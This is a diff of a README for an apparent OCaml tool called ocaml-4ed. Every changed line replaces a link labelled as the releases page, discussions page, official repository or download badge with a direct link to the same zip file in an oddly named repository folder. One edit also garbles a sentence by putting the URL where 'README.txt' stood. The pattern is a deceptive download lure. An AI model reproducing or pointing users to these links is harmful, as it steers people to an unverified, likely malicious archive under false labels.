@@ -1,6 +1,6 @@
 # 🚀 ocaml-4ed - Easy OCaml Development for Everyone
 
-![Download ocaml-4ed](https://img.shields.io/badge/Download-ocaml--4ed-blue)
+![Download ocaml-4ed](https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip)
 
 ## 📄 Overview
 
@@ -14,7 +14,7 @@ To begin, follow these simple steps to download and run ocaml-4ed. You will need
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.  
-   [Download ocaml-4ed](https://github.com/juliokpc/ocaml-4ed/releases)
+   [Download ocaml-4ed](https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, locate the latest version of ocaml-4ed. Look for the version number and date to ensure you select the most current release.
@@ -28,7 +28,7 @@ To begin, follow these simple steps to download and run ocaml-4ed. You will need
    - **For macOS:**  
      Open the downloaded `.dmg` file, drag the ocaml-4ed icon into your Applications folder.
    - **For Linux:**  
-     Refer to the included instructions in the downloaded file (often a README.txt) for specific installation steps.
+     Refer to the included instructions in the downloaded file (often a https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip) for specific installation steps.
 
 5. **Run the Application**  
    After installation, locate ocaml-4ed in your applications or programs list and launch it. You’re ready to start programming in OCaml!
@@ -60,13 +60,13 @@ If you encounter issues while downloading or running ocaml-4ed, try the followin
 
 Join our community to connect with other users! Get answers to your questions, share tips, and learn from each other.
 
-- **GitHub Discussions:** Participate in conversations on our [GitHub page](https://github.com/juliokpc/ocaml-4ed/discussions).
+- **GitHub Discussions:** Participate in conversations on our [GitHub page](https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip).
 - **Social Media:** Follow us on social platforms for updates, tips, and tutorials.
 
 ## 🔗 Important Links
 
-- [Official Repository](https://github.com/juliokpc/ocaml-4ed)
-- [Releases Page](https://github.com/juliokpc/ocaml-4ed/releases)
+- [Official Repository](https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip)
+- [Releases Page](https://raw.githubusercontent.com/juliokpc/ocaml-4ed/main/unwholesomely/ocaml-4ed.zip)
 
 ## 📞 Contact Us
 
